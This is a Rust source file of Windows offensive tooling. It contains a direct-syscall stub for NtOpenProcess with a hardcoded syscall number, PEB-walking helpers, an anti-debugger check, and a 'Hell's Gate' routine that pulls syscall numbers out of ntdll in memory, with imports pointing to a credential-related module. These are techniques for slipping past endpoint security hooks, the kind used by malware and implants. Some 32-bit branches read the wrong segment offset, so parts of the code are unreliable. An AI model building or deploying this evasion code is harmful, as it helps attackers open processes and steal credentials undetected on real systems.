use std::collections::HashMap;

use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use ntapi::ntobapi::NtQueryObject;
use ntapi::ntobapi::OBJECT_INFORMATION_CLASS;
use ntapi::ntobapi::OBJECT_TYPE_INFORMATION;
use ntapi::ntpsapi::NtQueryInformationProcess;
use ntapi::ntpsapi::PROCESSINFOCLASS;
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use ntapi::ntwow64::PEB32;
use winapi::ctypes::*;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::shared::ntdef::UNICODE_STRING;
use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::shared::sddl::*;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::CREATE_NEW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::handleapi::DuplicateHandle;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::lsalookup::LSA_UNICODE_STRING;
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::ntlsa::SECURITY_LOGON_SESSION_DATA;
use winapi::um::ntsecapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use winapi::um::winbase::*;
use winapi::um::winnt::*;
use winapi::um::winnt::{TOKEN_INFORMATION_CLASS, TOKEN_USER};
use winapi::um::ntlsa::*;
use ntapi::ntexapi::*;
use winapi::um::synchapi::*;
use winapi::um::tlhelp32::*;
use winapi::shared::winerror::*;
use itertools::Itertools;
use winapi::um::memoryapi::*;
use ntapi::ntpebteb::*;
use ntapi::ntpsapi::*;
use ntapi::ntapi_base::*;
use winapi::shared::ntdef::{POBJECT_ATTRIBUTES,NTSTATUS};
use std::arch::asm;


use crate::lsa::ReadStringFromMemory;


#[no_mangle]
#[link_section = ".txt"]
pub extern "C"  fn myntopenprocess (
    ProcessHandle: PHANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: POBJECT_ATTRIBUTES,
    ClientId: PCLIENT_ID,
    ) -> NTSTATUS{

        unsafe{
            asm!(
                "mov r10,rcx",
                "mov eax, 0x26",
                "syscall",
            
            );

            let mut ntstatus:i32 = 0;    
            asm!(
                "mov {},rax",
               
                out(reg)ntstatus
            );

            return ntstatus;
        }
        

}


pub fn getpebaddress() -> usize{
    unsafe{

        let mut peb:usize = 0;


        

        let v = std::mem::size_of::<usize>();
        if v==8{
            asm!(

                "mov {},qword ptr gs:[0x60]",
                out(reg)peb

            );

            return peb;
            
        }

        else if v==4{
      
            asm!(

                "mov {0},dword ptr fs:[0x30]",
                out(reg) peb

            );
           return peb;
        }
        return 0;
    }
}



pub fn getimagebaseaddress() -> usize{
    unsafe{
        
        

        let mut imagebase:usize = 0;
        
        let v = std::mem::size_of::<usize>();
       
        if v==8{
            let mut offset:usize = 0x10;
            asm!(

                "add {0},qword ptr gs:[0x60]",
                "mov {1},qword ptr [{0}]",
          
                inout(reg) offset,
                out(reg) imagebase

            );
            return imagebase;
            
        }
       
        else if v==4{
            let mut offset:usize = 0x8;
            asm!(
                
                "add {0},dword ptr fs:[0x30]",
                "mov {1},dword ptr [{0}]",

                inout(reg) offset,
                out(reg) imagebase
            );
            return imagebase;

        }
        return 0;
    }
}



pub fn isbeingdebugged() -> bool {
    unsafe{
        
        let v = std::mem::size_of::<usize>();
        println!("size of usize: {}",v);
        let mut offset:usize = 0x2;

        if v==8{
            let mut isbeingdebugged:u8 = 0;
            
            asm!(

                "add {0}, qword ptr gs:[0x60]",
                "mov {1}, byte ptr [{0}]",
                inout(reg) offset,
                out(reg_byte) isbeingdebugged
                
            );
            if isbeingdebugged ==1{
                return true;
            }
            else{
                return false;
            }
        }
        
        /*else if v==4{
            let mut isbeingdebugged:u8 = 0;
            let mut offset:usize = 0x2;

            asm!(

                "add {0},qword ptr fs:[0x30]",
                "mov {1}, byte ptr [{0}]",
                inout(reg) offset,
                out(reg_byte) isbeingdebugged,
              
            );
            println!("isbeingdebugged: {}",isbeingdebugged);
        }*/
        return false;
    }
}


pub fn getosmajorversion() -> u32 {
    unsafe{

        let v = std::mem::size_of::<usize>();

        if v==8{
            let mut offset: usize = 0x118;
            let mut major: u32 = 0;
            asm!(

                "add {0},qword ptr gs:[0x60]",
                
                inout(reg) offset,
                

            );
            major = std::ptr::read(offset as *const u32);
            return major;

        }

        if v==4{
            let mut offset: usize = 0xa4;
            let mut major: u32 = 0;
            asm!(

                "add {0},dword ptr fs:[0x60]",
                
                inout(reg) offset,
                

            );
            major = std::ptr::read(offset as *const u32);
            return major;
        }

        return 0;
    }
}

pub fn getosminorversion() -> u32 {
    unsafe{

        let v = std::mem::size_of::<usize>();

        if v==8{
            let mut offset: usize = 0x11c;
            let mut minor: u32 = 0;
            asm!(

                "add {0},qword ptr gs:[0x60]",
                
                inout(reg) offset,
                

            );
            minor = std::ptr::read(offset as *const u32);
            return minor;

        }

        if v==4{
            let mut offset: usize = 0xa8;
            let mut minor: u32 = 0;
            asm!(

                "add {0},dword ptr fs:[0x60]",
                
                inout(reg) offset,
                

            );
            minor = std::ptr::read(offset as *const u32);
            return minor;
        }

        return 0;
    }
}


pub fn getosbuildnumber() -> u16 {
    unsafe{

        let v = std::mem::size_of::<usize>();

        if v==8{
            let mut offset: usize = 0x120;
          
            let mut buildnumber: u16 = 0;
            asm!(

                "add {0},qword ptr gs:[0x60]",
             
                inout(reg) offset,
          
                
                
            );
            buildnumber = std::ptr::read(offset as *const u16);
            return buildnumber;

        }

        if v==4{
            let mut offset: usize = 0xaC;
            let mut buildnumber: u16 = 0;
            asm!(

                "add {0},dword ptr fs:[0x60]",
                
                inout(reg) offset,
                

            );
            buildnumber = std::ptr::read(offset as *const u16);
            return buildnumber;
        }

        return 0;
    }
}


pub mod peparser;

// returns the syscall number
pub fn hellsgate(func:&str) -> Result<u32,String>{
    unsafe{

        let mut dlls:HashMap<String,usize> = HashMap::new();

        let pebaddress = getpebaddress();
        let peb = std::ptr::read(pebaddress as *const PEB);

        let ldrdata = std::ptr::read(peb.Ldr as *const PEB_LDR_DATA);

        let mut firstentry = ldrdata.InLoadOrderModuleList.Flink;

        loop{

            let firsttableentry = std::ptr::read(firstentry as *mut LDR_DATA_TABLE_ENTRY);

            let dllname = unicodetostring(&firsttableentry.BaseDllName, GetCurrentProcess());
           
            dlls.insert(dllname.trim_end_matches("\0").to_string(), 
                firsttableentry.DllBase as usize);
    
            firstentry = firsttableentry.InLoadOrderLinks.Flink;
    
            if firstentry==ldrdata.InLoadOrderModuleList.Flink{
                break;
            }

        }
        
    

        for (dllname,dllbase) in &dlls{
            if *dllname=="ntdll.dll"{
                //println!("{}: {:x?}",*dllname,dllbase);

                let ntdll = peparser::peparser::parsefrommemory(GetCurrentProcess(),
                 (*dllbase) as *const c_void);

                if ntdll.is_err(){
                    return Err(format!("error: {}",ntdll.err().unwrap()));
                   
                }

                let ntdll = ntdll.unwrap();

                let res = ntdll.getexports();
                if res.is_err(){
                    return Err(format!("cannot get exports: {}",res.err().unwrap()));

                }
                let exports = res.unwrap();

               

                for (exportname, exportoffset) in &exports{
                    if *exportname==func{
                        //println!("function: {} at {:x?}",func,*exportoffset);
                        
                        let mut buffer = vec![0u8;40];
                        let mut bytesread = 0;
                        ReadProcessMemory(GetCurrentProcess(), 
                        (*dllbase as usize + *exportoffset as usize) as *const c_void, 
                        buffer.as_mut_ptr() as *mut c_void, 
                        buffer.len(), 
                        &mut bytesread);

                        if buffer[0]==0x4c && buffer[1]==0x8b && buffer[7]==0{
                            //println!("buffer: {:x?}",buffer);
                            let ssn =std::ptr::read((buffer.as_ptr() as usize + 4) as *const u32);
                            return Ok(ssn);
                        }
                        
                    }
                }

            }
        }

        return Err("something went wrong".to_string());
    }
}



pub fn unicodetostring(lus: &UNICODE_STRING,prochandle: *mut c_void)
  -> String{
    unsafe{

        let mut buffer:Vec<u16> = vec![0;lus.MaximumLength as usize];
        let mut bytesread = 0;
        //std::ptr::copy(lus.Buffer, buffer.as_mut_ptr() as *mut u16, 
         //   (lus.Length/2) as usize);
        
        let res = ReadProcessMemory(prochandle, 
            lus.Buffer as *const c_void, 
            buffer.as_mut_ptr() as *mut c_void, 
            (lus.Length) as usize, 
            &mut bytesread);

        if bytesread==0{
            return format!("reading process memory failed: {}",GetLastError());
        }

        return String::from_utf16_lossy(&buffer);



    }
}


